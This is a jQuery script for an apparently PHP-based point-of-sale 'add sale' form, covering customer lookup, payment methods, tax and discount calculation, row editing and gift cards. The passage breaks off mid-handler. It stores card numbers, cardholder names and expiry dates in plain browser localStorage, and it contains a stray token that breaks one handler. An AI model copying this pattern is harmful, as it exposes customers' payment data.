$(document).ready(function (e) {
    $('body a, body button').attr('tabindex', -1);
    check_add_item_val();
    if (site.settings.set_focus != 1) {
        $('#add_item').focus();
    }
    var $customer = $('#slcustomer');
    $customer.change(function (e) {paid_by_1
        localStorage.setItem('slcustomer', $(this).val());
        //$('#slcustomer_id').val($(this).val());
    });
    if (slcustomer = localStorage.getItem('slcustomer')) {
        $customer.val(slcustomer).select2({
            minimumInputLength: 1,
            data: [],
            initSelection: function (element, callback) {
                $.ajax({
                    type: "get", async: false,
                    url: site.base_url + "customers/getCustomereshop/" + $(element).val(),
                    dataType: "json",
                    success: function (data) {
                        callback(data[0]);
                    }
                });
            },
            ajax: {
                url: site.base_url + "customers/suggestions",
                dataType: 'json',
                quietMillis: 15,
                data: function (term, page) {
                    return {
                        term: term,
                        limit: 10
                    };
                },
                results: function (data, page) {
                    if (data.results != null) {
                        return {results: data.results};
                    } else {
                        return {results: [{id: '', text: 'No Match Found'}]};
                    }
                }
            }
        });
    } else {
        nsCustomer();
    }

// Order level shipping and discount localStorage
    if (sldiscount = localStorage.getItem('sldiscount')) {
        $('#sldiscount').val(sldiscount);
    }
    $('#sltax2').change(function (e) {
        localStorage.setItem('sltax2', $(this).val());
        $('#sltax2').val($(this).val());
    });
    if (sltax2 = localStorage.getItem('sltax2')) {
        $('#sltax2').select2("val", sltax2);
    }
    $('#slsale_status').change(function (e) {
        localStorage.setItem('slsale_status', $(this).val());
    });
    if (slsale_status = localStorage.getItem('slsale_status')) {
        if (slsale_status != 'pending')
            $('#slsale_status').select2("val", slsale_status);
    }
    $('#slpayment_status').change(function (e) {
        var ps = $(this).val();
        localStorage.setItem('slpayment_status', ps);
        if (ps == 'partial' || ps == 'paid') {
           // if (ps == 'paid') {
            //}
            //var paid_amount = $('#paid_amount').val();
            var paid_amount = ($('#paid_amount').val()) ? $('#paid_amount').val() : 0 ;
            var Amt = formatDecimal(parseFloat(((total + invoice_tax) - order_discount) + shipping - paid_amount));
            if (Amt < 0)
                Amt = 0;
            $('#amount_1').val(roundNumber(Amt, pos_settings.rounding));
            $('#amount_paid').val(roundNumber(Amt, pos_settings.rounding));//
            $('#payments').slideDown();
            $('#pcc_no_1').focus();
        } else {
            $('#amount_paid').val(0);//
            $('#payments').slideUp();
        }
    });
    if (slpayment_status = localStorage.getItem('slpayment_status')) {
        $('#slpayment_status').select2("val", slpayment_status);
        var ps = slpayment_status;
        if (ps == 'partial' || ps == 'paid') {
            $('#payments').slideDown();
            $('#pcc_no_1').focus();
        } else {
            $('#payments').slideUp();
        }
    }

    $(document).on('change', '.paid_by', function () {
        $('.final-btn').prop('disabled', false);
        var p_val = $(this).val();
        localStorage.setItem('paid_by', p_val);
        $('#rpaidby').val(p_val);
        $('.g_transaction_id').show();
        if (p_val == 'cash') {
            $('.g_transaction_id').hide();
            $('.pcheque_1').hide();
            $('.pcc_1').hide();
            $('.pcash_1').show();
            $('#payment_note_1').focus();
        }
        if (p_val == 'other') {
            $('.pcheque_1').hide();
            $('.pcc_1').hide();
            $('.pcash_1').show();
            $('#payment_note_1').focus();
        } else if (p_val == 'CC') {
            $('.pcheque_1').hide();
            $('.pcash_1').hide();
            //$('.pcc_1').show();
            $('#pcc_no_1').focus();
        } else if (p_val == 'Cheque') {
            $('.g_transaction_id').hide();
            $('.pcc_1').hide();
            $('.pcash_1').hide();
            $('.pcheque_1').show();
            $('#cheque_no_1').focus();
        } else {
            $('.pcheque_1').hide();
            $('.pcc_1').hide();
            $('.pcash_1').hide();
        }
        if (p_val == 'deposit') {
            $('.g_transaction_id').hide();
        }
        if (p_val == 'gift_card') {
            $('.final-btn').prop('disabled', true);
            $('.g_transaction_id').hide();
            $('.gc').show();
            $('.ngc').hide();
            $('#gift_card_no').focus();
        } else {
            $('.ngc').show();
            $('.gc').hide();
            $('#gc_details').html('');
        }
    });

    if (paid_by = localStorage.getItem('paid_by')) {
        $('.final-btn').prop('disabled', false);
        var p_val = paid_by;
        $('.paid_by').select2("val", paid_by);
        $('#rpaidby').val(p_val);
        $('.g_transaction_id').show();
        if (p_val == 'cash') {
            $('.g_transaction_id').hide();
            $('.pcheque_1').hide();
            $('.pcc_1').hide();
            $('.pcash_1').show();
            $('#payment_note_1').focus();
        }
        if (p_val == 'other') {
            $('.pcheque_1').hide();
            $('.pcc_1').hide();
            $('.pcash_1').show();
            $('#payment_note_1').focus();
        } else if (p_val == 'CC') {
            $('.pcheque_1').hide();
            $('.pcash_1').hide();
            //$('.pcc_1').show();
            $('#pcc_no_1').focus();
        } else if (p_val == 'Cheque') {
            $('.g_transaction_id').hide();
            $('.pcc_1').hide();
            $('.pcash_1').hide();
            $('.pcheque_1').show();
            $('#cheque_no_1').focus();
        } else {
            $('.pcheque_1').hide();
            $('.pcc_1').hide();
            $('.pcash_1').hide();
        }
        if (p_val == 'deposit') {
            $('.g_transaction_id').hide();
        }
        if (p_val == 'gift_card') {
            $('.final-btn').prop('disabled', true);
            $('.g_transaction_id').hide();
            $('.gc').show();
            $('.ngc').hide();
            $('#gift_card_no').focus();
        } else {
            $('.ngc').show();
            $('.gc').hide();
            $('#gc_details').html('');
        }
    }

    /*if (gift_card_no = localStorage.getItem('gift_card_no')) {
     $('#gift_card_no').val(gift_card_no);
     }*/
    $('#gift_card_no').change(function (e) {
        localStorage.setItem('gift_card_no', $(this).val());
    });

    if (amount_1 = localStorage.getItem('amount_1')) {
        $('#amount_1').val(amount_1);
    }
    $('#amount_1').change(function (e) {
        localStorage.setItem('amount_1', $(this).val());
    });

    if (paid_by_1 = localStorage.getItem('paid_by_1')) {
        $('#paid_by_1').val(paid_by_1);
    }
    $('#paid_by_1').change(function (e) {
        localStorage.setItem('paid_by_1', $(this).val());
    });

    if (pcc_holder_1 = localStorage.getItem('pcc_holder_1')) {
        $('#pcc_holder_1').val(pcc_holder_1);
    }
    $('#pcc_holder_1').change(function (e) {
        localStorage.setItem('pcc_holder_1', $(this).val());
    });

    if (pcc_type_1 = localStorage.getItem('pcc_type_1')) {
        $('#pcc_type_1').select2("val", pcc_type_1);
    }
    $('#pcc_type_1').change(function (e) {
        localStorage.setItem('pcc_type_1', $(this).val());
    });

    if (pcc_month_1 = localStorage.getItem('pcc_month_1')) {
        $('#pcc_month_1').val(pcc_month_1);
    }
    $('#pcc_month_1').change(function (e) {
        localStorage.setItem('pcc_month_1', $(this).val());
    });

    if (pcc_year_1 = localStorage.getItem('pcc_year_1')) {
        $('#pcc_year_1').val(pcc_year_1);
    }
    $('#pcc_year_1').change(function (e) {
        localStorage.setItem('pcc_year_1', $(this).val());
    });

    if (pcc_no_1 = localStorage.getItem('pcc_no_1')) {
        $('#pcc_no_1').val(pcc_no_1);
    }
    $('#pcc_no_1').change(function (e) {
        var pcc_no = $(this).val();
        localStorage.setItem('pcc_no_1', pcc_no);
        var CardType = null;
        var ccn1 = pcc_no.charAt(0);
        if (ccn1 == 4)
            CardType = 'Visa';
        else if (ccn1 == 5)
            CardType = 'MasterCard';
        else if (ccn1 == 3)
            CardType = 'Amex';
        else if (ccn1 == 6)
            CardType = 'Discover';
        else
            CardType = 'Visa';

        $('#pcc_type_1').select2("val", CardType);
    });

    if (cheque_no_1 = localStorage.getItem('cheque_no_1')) {
        $('#cheque_no_1').val(cheque_no_1);
    }
    $('#cheque_no_1').change(function (e) {
        localStorage.setItem('cheque_no_1', $(this).val());
    });

    if (payment_note_1 = localStorage.getItem('payment_note_1')) {
        $('#payment_note_1').redactor('set', payment_note_1);
    }
    $('#payment_note_1').redactor('destroy');
    $('#payment_note_1').redactor({
        buttons: ['formatting', '|', 'alignleft', 'aligncenter', 'alignright', 'justify', '|', 'bold', 'italic', 'underline', '|', 'unorderedlist', 'orderedlist', '|', 'link', '|', 'html'],
        formattingTags: ['p', 'pre', 'h3', 'h4'],
        minHeight: 100,
        changeCallback: function (e) {
            var v = this.get();
            localStorage.setItem('payment_note_1', v);
        }
    });

    var old_payment_term;
    $('#slpayment_term').focus(function () {
        old_payment_term = $(this).val();
    }).change(function (e) {
        var new_payment_term = $(this).val() ? parseFloat($(this).val()) : 0;
        if ($(this).val() != '') {
            if (!is_numeric($(this).val())) {
                $(this).val(old_payment_term);
                bootbox.alert(lang.unexpected_value);
                return;
            } else {
                localStorage.setItem('slpayment_term', new_payment_term);
                $('#slpayment_term').val(new_payment_term);
            }
        } else {
            localStorage.setItem('slpayment_term', '');
            $('#slpayment_term').val('');
        }

    });
    if (slpayment_term = localStorage.getItem('slpayment_term')) {
        $('#slpayment_term').val(slpayment_term);
    }

    var old_shipping;
    $('#slshipping').focus(function () {
        old_shipping = $(this).val();
    }).change(function () {
        if (!is_numeric($(this).val())) {
            //$(this).val(0);
            shipping = $(this).val() ? parseFloat($(this).val()) : '0';
            bootbox.alert(lang.unexpected_value);
            return;
        } else {
            shipping = $(this).val() ? parseFloat($(this).val()) : '0';
        }
        localStorage.setItem('slshipping', shipping);
        var gtotal = ((total + invoice_tax) - order_discount) + shipping;
        $('#gtotal').text(formatMoney(gtotal));
        $('#tship').text(formatMoney(shipping));
    });
    if (slshipping = localStorage.getItem('slshipping')) {
        shipping = parseFloat(slshipping);
        $('#slshipping').val(shipping);
    } else {
        shipping = 0;
    }
    $('#add_sale, #edit_sale').attr('disabled', true);
    $(document).on('change', '.rserial', function () {
        var item_id = $(this).closest('tr').attr('data-item-id');
        slitems[item_id].row.serial = $(this).val();
        localStorage.setItem('slitems', JSON.stringify(slitems));
    });

// If there is any item in localStorage
    if (localStorage.getItem('slitems')) {
        loadItems();
    }

    // clear localStorage and reload
    $('#reset').click(function (e) {
        bootbox.confirm(lang.r_u_sure, function (result) {
            if (result) {
                if (localStorage.getItem('slitems')) {
                    localStorage.removeItem('slitems');
                }
                if (localStorage.getItem('sldiscount')) {
                    localStorage.removeItem('sldiscount');
                }
                if (localStorage.getItem('sltax2')) {
                    localStorage.removeItem('sltax2');
                }
                if (localStorage.getItem('slshipping')) {
                    localStorage.removeItem('slshipping');
                }
                if (localStorage.getItem('slref')) {
                    localStorage.removeItem('slref');
                }
                if (localStorage.getItem('slwarehouse')) {
                    localStorage.removeItem('slwarehouse');
                }
                if (localStorage.getItem('slnote')) {
                    localStorage.removeItem('slnote');
                }
                if (localStorage.getItem('slinnote')) {
                    localStorage.removeItem('slinnote');
                }
                if (localStorage.getItem('slcustomer')) {
                    localStorage.removeItem('slcustomer');
                }
                if (localStorage.getItem('slcurrency')) {
                    localStorage.removeItem('slcurrency');
                }
                if (localStorage.getItem('sldate')) {
                    localStorage.removeItem('sldate');
                }
                if (localStorage.getItem('slstatus')) {
                    localStorage.removeItem('slstatus');
                }
                if (localStorage.getItem('slbiller')) {
                    localStorage.removeItem('slbiller');
                }
                if (localStorage.getItem('gift_card_no')) {
                    localStorage.removeItem('gift_card_no');
                }

                $('#modal-loading').show();
                location.reload();
            }
        });
    });

// save and load the fields in and/or from localStorage

    $('#slref').change(function (e) {
        localStorage.setItem('slref', $(this).val());
    });
    if (slref = localStorage.getItem('slref')) {
        $('#slref').val(slref);
    }

    $('#slwarehouse').change(function (e) {
        localStorage.setItem('slwarehouse', $(this).val());
    });
    if (slwarehouse = localStorage.getItem('slwarehouse')) {
        $('#slwarehouse').select2("val", slwarehouse);
    }

    $('#slnote').redactor('destroy');
    $('#slnote').redactor({
        buttons: ['formatting', '|', 'alignleft', 'aligncenter', 'alignright', 'justify', '|', 'bold', 'italic', 'underline', '|', 'unorderedlist', 'orderedlist', '|', 'link', '|', 'html'],
        formattingTags: ['p', 'pre', 'h3', 'h4'],
        minHeight: 100,
        changeCallback: function (e) {
            var v = this.get();
            localStorage.setItem('slnote', v);
        }
    });
    if (slnote = localStorage.getItem('slnote')) {
        $('#slnote').redactor('set', slnote);
    }
    $('#slinnote').redactor('destroy');
    $('#slinnote').redactor({
        buttons: ['formatting', '|', 'alignleft', 'aligncenter', 'alignright', 'justify', '|', 'bold', 'italic', 'underline', '|', 'unorderedlist', 'orderedlist', '|', 'link', '|', 'html'],
        formattingTags: ['p', 'pre', 'h3', 'h4'],
        minHeight: 100,
        changeCallback: function (e) {
            var v = this.get();
            localStorage.setItem('slinnote', v);
        }
    });
    if (slinnote = localStorage.getItem('slinnote')) {
        $('#slinnote').redactor('set', slinnote);
    }

    // prevent default action usln enter
    $('body').bind('keypress', function (e) {
        if ($(e.target).hasClass('redactor_editor')) {
            return true;
        }
        if (e.keyCode == 13) {
            e.preventDefault();
            return false;
        }
    });

    // Order tax calculation
    if (site.settings.tax2 != 0) {
        $('#sltax2').change(function () {
            localStorage.setItem('sltax2', $(this).val());
            loadItems();
            return;
        });
    }

    // Order discount calculation
    var old_sldiscount;
    $('#sldiscount').focus(function () {
        old_sldiscount = $(this).val();
    }).change(function () {
        var new_discount = $(this).val() ? $(this).val() : '0';
        if (is_valid_discount(new_discount)) {
            localStorage.removeItem('sldiscount');
            localStorage.setItem('sldiscount', new_discount);
            loadItems();
            return;
        } else {
            $(this).val(old_sldiscount);
            bootbox.alert(lang.unexpected_value);
            return;
        }

    });


    /* ----------------------
     * Delete Row Method
     * ---------------------- */
    $(document).on('click', '.sldel', function () {
        var row = $(this).closest('tr');
        var item_id = row.attr('data-item-id');
        delete slitems[item_id];
        row.remove();
        if (slitems.hasOwnProperty(item_id)) {
        } else {
            localStorage.setItem('slitems', JSON.stringify(slitems));
            loadItems();
            return;
        }
    });


    /* -----------------------
     * Edit Row Modal Hanlder
     ----------------------- */
    $(document).on('click', '.edit', function () {
        var row = $(this).closest('tr');
        var row_id = row.attr('id');
        item_id = row.attr('data-item-id');
        item = slitems[item_id];
        var qty = row.children().children('.rquantity').val(),
                product_option = row.children().children('.roption').val(),
                unit_price = formatDecimal(row.children().children('.ruprice').val()),
                discount = row.children().children('.rdiscount').val();
        var cf1 = row.children().children('.cf1').val();
        var cf2 = row.children().children('.cf2').val();
        if (item.options !== false) {
            $.each(item.options, function () {
                if (this.id == item.row.option && this.price != 0 && this.price != '' && this.price != null) {
                    unit_price = parseFloat(item.row.real_unit_price) + parseFloat(this.price);
                }
            });
        }
        var real_unit_price = item.row.real_unit_price;
        var net_price = unit_price;
        $('#prModalLabel').text(item.row.name + ' (' + item.row.code + ')');
        if (site.settings.tax1) {
            $('#ptax').select2('val', item.row.tax_rate);
            $('#old_tax').val(item.row.tax_rate);
            var item_discount = 0, ds = discount ? discount : '0';
            if (ds.indexOf("%") !== -1) {
                var pds = ds.split("%");
                if (!isNaN(pds[0])) {
                    item_discount = formatDecimal(parseFloat(((unit_price) * parseFloat(pds[0])) / 100), 4);
                } else {
                    item_discount = parseFloat(ds);
                }
            } else {
                item_discount = parseFloat(ds);
            }
            net_price -= item_discount;
            var pr_tax = item.row.tax_rate, pr_tax_val = 0;
            if (pr_tax !== null && pr_tax != 0) {
                $.each(tax_rates, function () {
                    if (this.id == pr_tax) {
                        if (this.type == 1) {

                            if (slitems[item_id].row.tax_method == 0) {
                                pr_tax_val = formatDecimal((((net_price) * parseFloat(this.rate)) / (100 + parseFloat(this.rate))), 4);
                                pr_tax_rate = formatDecimal(this.rate) + '%';
                                net_price -= pr_tax_val;
                            } else {
                                pr_tax_val = formatDecimal((((net_price) * parseFloat(this.rate)) / 100), 4);
                                pr_tax_rate = formatDecimal(this.rate) + '%';
                            }

                        } else if (this.type == 2) {

                            pr_tax_val = parseFloat(this.rate);
                            pr_tax_rate = this.rate;

                        }
                    }
                });
            }
        }
        if (site.settings.product_serial !== 0) {
            $('#pserial').val(row.children().children('.rserial').val());
        }
        var opt = '<p style="margin: 12px 0 0 0;">n/a</p>';
        if (item.options !== false) {
            var o = 1;
            opt = $("<select id=\"poption\" name=\"poption\" class=\"form-control select\" />");
            $.each(item.options, function () {
                if (o == 1) {
                    if (product_option == '') {
                        product_variant = this.id;
                    } else {
                        product_variant = product_option;
                    }
                }
                $("<option />", {value: this.id, text: this.name}).appendTo(opt);
                o++;
            });
        } else {
            product_variant = 0;
        }

        uopt = $("<select id=\"punit\" name=\"punit\" class=\"form-control select\" />");
        $.each(item.units, function () {
            if (this.id == item.row.unit) {
                $("<option />", {value: this.id, text: this.name, selected: true}).appendTo(uopt);
            } else {
                $("<option />", {value: this.id, text: this.name}).appendTo(uopt);
            }
        });

        $('#poptions-div').html(opt);
        $('#punits-div').html(uopt);
        $('select.select').select2({minimumResultsForSearch: 7});
        $('#pquantity').val(qty);
        $('#cf1').val(cf1);
        $('#cf2').val(cf2);
        $('#old_qty').val(qty);
        $('#pprice').val(unit_price);
        $('#punit_price').val(formatDecimal(parseFloat(unit_price) + parseFloat(pr_tax_val)));
        $('#poption').select2('val', item.row.option);
        $('#old_price').val(unit_price);
        $('#row_id').val(row_id);
        $('#item_id').val(item_id);
        $('#pserial').val(row.children().children('.rserial').val());
        $('#pdiscount').val(discount);
        $('#net_price').text(formatMoney(net_price));
        $('#pro_tax').text(formatMoney(pr_tax_val));
        $('#prModal').appendTo("body").modal('show');

    });

    $('#prModal').on('shown.bs.modal', function (e) {
        if ($('#poption').select2('val') != '') {
            $('#poption').select2('val', product_variant);
            product_variant = 0;
        }
    });

    $(document).on('change', '#pprice, #ptax, #pdiscount', function () {
        var row = $('#' + $('#row_id').val());
        var item_id = row.attr('data-item-id');
        var unit_price = parseFloat($('#pprice').val());
        var item = slitems[item_id];
        var ds = $('#pdiscount').val() ? $('#pdiscount').val() : '0';
        if (ds.indexOf("%") !== -1) {
            var pds = ds.split("%");
            if (!isNaN(pds[0])) {
                item_discount = parseFloat(((unit_price) * parseFloat(pds[0])) / 100);
            } else {
                item_discount = parseFloat(ds);
            }
        } else {
            item_discount = parseFloat(ds);
        }
        unit_price -= item_discount;
        var pr_tax = $('#ptax').val(), item_tax_method = item.row.tax_method;
        var pr_tax_val = 0, pr_tax_rate = 0;
        if (pr_tax !== null && pr_tax != 0) {
            $.each(tax_rates, function () {
                if (this.id == pr_tax) {
                    if (this.type == 1) {

                        if (item_tax_method == 0) {
                            pr_tax_val = formatDecimal(((unit_price) * parseFloat(this.rate)) / (100 + parseFloat(this.rate)), 4);
                            pr_tax_rate = formatDecimal(this.rate) + '%';
                            unit_price -= pr_tax_val;
                        } else {
                            pr_tax_val = formatDecimal((((unit_price) * parseFloat(this.rate)) / 100), 4);
                            pr_tax_rate = formatDecimal(this.rate) + '%';
                        }

                    } else if (this.type == 2) {

                        pr_tax_val = parseFloat(this.rate);
                        pr_tax_rate = this.rate;

                    }
                }
            });
        }

        $('#net_price').text(formatMoney(unit_price));
        $('#pro_tax').text(formatMoney(pr_tax_val));
    });

    $(document).on('change', '#punit', function () {
        var row = $('#' + $('#row_id').val());
        var item_id = row.attr('data-item-id');
        var item = slitems[item_id];
        if (!is_numeric($('#pquantity').val()) || parseFloat($('#pquantity').val()) < 0) {
            $(this).val(old_row_qty);
            bootbox.alert(lang.unexpected_value);
            return;
        }
        var opt = $('#poption').val(), nameunit = $('#punit option:selected').text(), unit = $('#punit').val(), base_quantity = $('#pquantity').val(), aprice = 0;
        if (item.options !== false) {
            $.each(item.options, function () {
                if (this.id == opt && this.price != 0 && this.price != '' && this.price != null) {
                    aprice = parseFloat(this.price);
                }
            });
        }
        if (unit != slitems[item_id].row.base_unit) {
            $.each(item.units, function () {
                if (this.id == unit) {
                    base_quantity = unitToBaseQty($('#pquantity').val(), this);
                    $('#pprice').val(formatDecimal(((parseFloat(item.row.base_unit_price + aprice)) * unitToBaseQty(1, this)), 4)).change();
                }
            });
        } else {
            $('#pprice').val(formatDecimal(item.row.base_unit_price + aprice)).change();
        }
        slitems[item_id].row.unit_lable = nameunit;
        localStorage.setItem('slitems', JSON.stringify(slitems));
    });

    /* -----------------------
     * Edit Row Method
     ----------------------- */
    $(document).on('click', '#editItem', function () {
        var row = $('#' + $('#row_id').val());
        var item_id = row.attr('data-item-id'), new_pr_tax = $('#ptax').val(), new_pr_tax_rate = false;
        if (new_pr_tax) {
            $.each(tax_rates, function () {
                if (this.id == new_pr_tax) {
                    new_pr_tax_rate = this;
                }
            });
        }
        var price = parseFloat($('#pprice').val());
        if (item.options !== false) {
            var opt = $('#poption').val();
            $.each(item.options, function () {
                if (this.id == opt && this.price != 0 && this.price != '' && this.price != null) {
                    price = price - parseFloat(this.price);
                }
            });
        }
        if (site.settings.product_discount == 1 && $('#pdiscount').val()) {
            if (!is_valid_discount($('#pdiscount').val()) || $('#pdiscount').val() > price) {
                bootbox.alert(lang.unexpected_value);
                return false;
            }
        }
        if (!is_numeric($('#pquantity').val()) || parseFloat($('#pquantity').val()) < 0) {
            $(this).val(old_row_qty);
            bootbox.alert(lang.unexpected_value);
            return;
        }
        var unit = $('#punit').val();
        var base_quantity = parseFloat($('#pquantity').val());
        if (unit != slitems[item_id].row.base_unit) {
            $.each(slitems[item_id].units, function () {
                if (this.id == unit) {
                    base_quantity = unitToBaseQty($('#pquantity').val(), this);
                }
            });
        }

        slitems[item_id].row.fup = 1,
                slitems[item_id].row.qty = parseFloat($('#pquantity').val()),
                slitems[item_id].row.base_quantity = parseFloat(base_quantity),
                slitems[item_id].row.real_unit_price = price,
                slitems[item_id].row.unit = unit,
                slitems[item_id].row.tax_rate = new_pr_tax,
                slitems[item_id].tax_rate = new_pr_tax_rate,
                slitems[item_id].row.discount = $('#pdiscount').val() ? $('#pdiscount').val() : '',
                slitems[item_id].row.option = $('#poption').val() ? $('#poption').val() : '',
                slitems[item_id].row.serial = $('#pserial').val();
        slitems[item_id].row.cf1 = $('#cf1').val();
        slitems[item_id].row.cf2 = $('#cf2').val();
        localStorage.setItem('slitems', JSON.stringify(slitems));
        $('#prModal').modal('hide');
        // console.log('----------------');
        // console.log(slitems);
        loadItems();
        return;
    });

    /* -----------------------
     * Product option change
     ----------------------- */
    $(document).on('change', '#poption', function () {
        var row = $('#' + $('#row_id').val()), opt = $(this).val();
        var item_id = row.attr('data-item-id');
        var item = slitems[item_id];
        var unit = $('#punit').val(), base_quantity = parseFloat($('#pquantity').val()), base_unit_price = item.row.base_unit_price;
        if (unit != slitems[item_id].row.base_unit) {
            $.each(slitems[item_id].units, function () {
                if (this.id == unit) {
                    base_unit_price = formatDecimal((parseFloat(item.row.base_unit_price) * (unitToBaseQty(1, this))), 4)
                    base_quantity = unitToBaseQty($('#pquantity').val(), this);
                }
            });
        }
        $('#pprice').val(parseFloat(base_unit_price)).trigger('change');
        if (item.options !== false) {
            $.each(item.options, function () {
                if (this.id == opt && this.price != 0 && this.price != '' && this.price != null) {
                    $('#pprice').val(parseFloat(base_unit_price) + (parseFloat(this.price))).trigger('change');
                }
            });
        }
    });

    /* ------------------------------
     * Sell Gift Card modal
     ------------------------------- */
    $(document).on('click', '#sellGiftCard', function (e) {
        if (count == 1) {
            slitems = {};
            if ($('#slwarehouse').val() && $('#slcustomer').val()) {
                $('#slcustomer').select2("readonly", true);
                $('#slwarehouse').select2("readonly", true);
            } else {
                bootbox.alert(lang.select_above);
                item = null;
                return false;
            }
        }
        $('#gcModal').appendTo("body").modal('show');
        return false;
    });

    $(document).on('click', '#addGiftCard', function (e) {
        var mid = (new Date).getTime(),
                gccode = $('#gccard_no').val(),
                gcname = $('#gcname').val(),
                gcvalue = $('#gcvalue').val(),
                gccustomer = $('#gccustomer').val(),
                gcexpiry = $('#gcexpiry').val() ? $('#gcexpiry').val() : '',
                gcprice = parseFloat($('#gcprice').val());
        if (gccode == '' || gcvalue == '' || gcprice == '' || gcvalue == 0 || gcprice == 0) {
            $('#gcerror').text('Please fill the required fields');
            $('.gcerror-con').show();
            return false;
        }

        var gc_data = new Array();
        gc_data[0] = gccode;
        gc_data[1] = gcvalue;
        gc_data[2] = gccustomer;
        gc_data[3] = gcexpiry;
        //if (typeof slitems === "undefined") {
        //    var slitems = {};
        //}

        $.ajax({
            type: 'get',
            url: site.base_url + 'sales/sell_gift_card',
            dataType: "json",
            data: {gcdata: gc_data},
            success: function (data) {
                if (data.result === 'success') {
                    slitems[mid] = {"id": mid, "item_id": mid, "label": gcname + ' (' + gccode + ')', "row": {"id": mid, "code": gccode, "name": gcname, "quantity": 1, "price": gcprice, "real_unit_price": gcprice, "tax_rate": 0, "qty": 1, "type": "manual", "discount": "0", "serial": "", "option": ""}, "tax_rate": false, "options": false};
                    localStorage.setItem('slitems', JSON.stringify(slitems));
                    loadItems();
                    $('#gcModal').modal('hide');
                    $('#gccard_no').val('');
                    $('#gcvalue').val('');
                    $('#gcexpiry').val('');
                    $('#gcprice').val('');
                } else {
                    $('#gcerror').text(data.message);
                    $('.gcerror-con').show();
                }
            }
        });
        return false;
    });

    /* ------------------------------
     * Show manual item addition modal
     ------------------------------- */
    $(document).on('click', '#addManually', function (e) {
        if (count == 1) {
            slitems = {};
            if ($('#slwarehouse').val() && $('#slcustomer').val()) {
                $('#slcustomer').select2("readonly", true);
                $('#slwarehouse').select2("readonly", true);
            } else {
                bootbox.alert(lang.select_above);
                item = null;
                return false;
            }
        }
        $('#mnet_price').text('0.00');
        $('#mpro_tax').text('0.00');
        $('#mModal').appendTo("body").modal('show');
        return false;
    });

    $(document).on('click', '#addItemManually', function (e) {
        var mid = (new Date).getTime(),
                mcode = $('#mcode').val(),
                mname = $('#mname').val(),
                mtax = parseInt($('#mtax').val()),
                mqty = parseFloat($('#mquantity').val()),
                mdiscount = $('#mdiscount').val() ? $('#mdiscount').val() : '0',
                unit_price = parseFloat($('#mprice').val()),
                mtax_rate = {};
        if (mcode && mname && mqty && unit_price) {
            $.each(tax_rates, function () {
                if (this.id == mtax) {
                    mtax_rate = this;
                }
            });

            slitems[mid] = {"id": mid, "item_id": mid, "label": mname + ' (' + mcode + ')', "row": {"id": mid, "code": mcode, "name": mname, "quantity": mqty, "price": unit_price, "unit_price": unit_price, "real_unit_price": unit_price, "tax_rate": mtax, "tax_method": 0, "qty": mqty, "type": "manual", "discount": mdiscount, "serial": "", "option": ""}, "tax_rate": mtax_rate, 'units': false, "options": false};
            localStorage.setItem('slitems', JSON.stringify(slitems));
            loadItems();
        }
        $('#mModal').modal('hide');
        $('#mcode').val('');
        $('#mname').val('');
        $('#mtax').val('');
        $('#mquantity').val('');
        $('#mdiscount').val('');
        $('#mprice').val('');
        return false;
    });

    $(document).on('change', '#mprice, #mtax, #mdiscount', function () {
        var unit_price = parseFloat($('#mprice').val());
        var ds = $('#mdiscount').val() ? $('#mdiscount').val() : '0';
        if (ds.indexOf("%") !== -1) {
            var pds = ds.split("%");
            if (!isNaN(pds[0])) {
                item_discount = parseFloat(((unit_price) * parseFloat(pds[0])) / 100);
            } else {
                item_discount = parseFloat(ds);
            }
        } else {
            item_discount = parseFloat(ds);
        }
        unit_price -= item_discount;
        var pr_tax = $('#mtax').val(), item_tax_method = 0;
        var pr_tax_val = 0, pr_tax_rate = 0;
        if (pr_tax !== null && pr_tax != 0) {
            $.each(tax_rates, function () {
                if (this.id == pr_tax) {
                    if (this.type == 1) {

                        if (item_tax_method == 0) {
                            pr_tax_val = formatDecimal((((unit_price) * parseFloat(this.rate)) / (100 + parseFloat(this.rate))), 4);
                            pr_tax_rate = formatDecimal(this.rate) + '%';
                            unit_price -= pr_tax_val;
                        } else {
                            pr_tax_val = formatDecimal((((unit_price) * parseFloat(this.rate)) / 100), 4);
                            pr_tax_rate = formatDecimal(this.rate) + '%';
                        }

                    } else if (this.type == 2) {

                        pr_tax_val = parseFloat(this.rate);
                        pr_tax_rate = this.rate;

                    }
                }
            });
        }

        $('#mnet_price').text(formatMoney(unit_price));
        $('#mpro_tax').text(formatMoney(pr_tax_val));
    });

    /* --------------------------
     * Edit Row Quantity Method
     --------------------------- */
    var old_row_qty;
    $(document).on("focus", '.rquantity', function () {
        old_row_qty = $(this).val();
    }).on("change", '.rquantity', function () {
        var row = $(this).closest('tr');
        if (!is_numeric($(this).val()) || parseFloat($(this).val()) < 0) {
            $(this).val(old_row_qty);
            bootbox.alert(lang.unexpected_value);
            return;
        }
        var new_qty = parseFloat($(this).val()),
                item_id = row.attr('data-item-id');
        slitems[item_id].row.base_quantity = new_qty;
        if (slitems[item_id].row.unit != slitems[item_id].row.base_unit) {
            $.each(slitems[item_id].units, function () {
                if (this.id == slitems[item_id].row.unit) {
                    slitems[item_id].row.base_quantity = unitToBaseQty(new_qty, this);
                }
            });
        }
        slitems[item_id].row.qty = new_qty;
        slitems[item_id].row.item_weight = new_qty * slitems[item_id].row.unit_weight;
        localStorage.setItem('slitems', JSON.stringify(slitems));
        loadItems();
    });

    /* --------------------------
     * Edit Row Weight Method
     --------------------------- */
    var old_row_item_weight;
    $(document).on("focus", '.ritem_weight', function () {
        old_row_qty = $(this).val();
    }).on("change", '.ritem_weight', function () {
        var row = $(this).closest('tr');
        if (!is_numeric($(this).val()) || parseFloat($(this).val()) < 0) {
            $(this).val(old_row_item_weight);
            bootbox.alert(lang.unexpected_value);
            return;
        }
        var new_item_weight = parseFloat($(this).val()),
                item_id = row.attr('data-item-id');
        slitems[item_id].row.item_weight = new_item_weight;

        var item_qty = slitems[item_id].row.qty;

        var unit_weight = parseFloat(new_item_weight) / parseFloat(item_qty)

        slitems[item_id].row.unit_weight = unit_weight;
        slitems[item_id].row.item_weight = new_item_weight;

        localStorage.setItem('slitems', JSON.stringify(slitems));
        loadItems();
    });

    /* --------------------------
     * Edit Row Price Method
     -------------------------- */
    var old_price;
    $(document).on("focus", '.rprice', function () {
        old_price = $(this).val();
    }).on("change", '.rprice', function () {
        var row = $(this).closest('tr');
        if (!is_numeric($(this).val())) {
            $(this).val(old_price);
            bootbox.alert(lang.unexpected_value);
            return;
        }
        var new_price = parseFloat($(this).val()),
                item_id = row.attr('data-item-id');
        slitems[item_id].row.price = new_price;
        localStorage.setItem('slitems', JSON.stringify(slitems));
        loadItems();
    });

    $(document).on("click", '#removeReadonly', function () {
